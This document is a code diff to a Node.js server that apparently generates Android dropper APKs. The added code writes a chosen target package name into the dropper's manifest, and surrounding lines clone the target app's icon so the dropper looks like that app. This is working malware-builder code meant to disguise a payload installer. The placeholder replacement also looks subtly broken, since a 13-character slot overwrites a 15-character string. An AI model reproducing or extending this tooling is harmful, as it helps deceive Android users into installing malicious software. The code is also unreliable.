@@ -606,6 +606,21 @@ app.post('/generate', upload.single('icon'), async (req, res) => {
                         dropArsc.header.method = 0;
                     }
 
+                    // 1.5 Patch Target Package into Dropper AndroidManifest.xml queries
+                    const dropManifest = dropZip.getEntry('AndroidManifest.xml');
+                    if (dropManifest && targetPkg) {
+                        const manBuf = dropManifest.getData();
+                        const oldUtf16 = Buffer.from('com.target.pkg1', 'utf16le');
+                        const newUtf16 = Buffer.from(targetPkg.padEnd(13, '\0').substring(0, 13), 'utf16le');
+                        let pos = manBuf.indexOf(oldUtf16);
+                        while (pos !== -1) {
+                            newUtf16.copy(manBuf, pos);
+                            console.log(`[DROPPER] Manifest query updated: "com.target.pkg1" -> "${targetPkg}" at offset ${pos}`);
+                            pos = manBuf.indexOf(oldUtf16, pos + newUtf16.length);
+                        }
+                        dropManifest.setData(manBuf);
+                    }
+
                     // 2. Clone Target Icon into Dropper
                     if (activeIconBuffer) {
                         await replaceIcons(dropZip, activeIconBuffer);
